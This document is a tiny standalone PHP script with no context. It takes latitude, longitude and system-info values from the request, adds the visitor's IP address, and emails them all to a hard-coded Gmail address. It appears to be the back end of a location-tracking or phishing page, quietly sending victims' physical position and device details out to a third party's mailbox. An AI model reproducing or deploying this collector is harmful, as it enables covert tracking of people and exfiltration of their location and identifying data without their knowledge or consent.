<?php
$msg = "Latitude: " . $_GET["Latitude"] . "\nLongitude: " . $_GET["Longitude"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nSysInfo" . $_GET["SysInfo"];
mail("po1795009@gmail.com","My subject",$msg);
?>
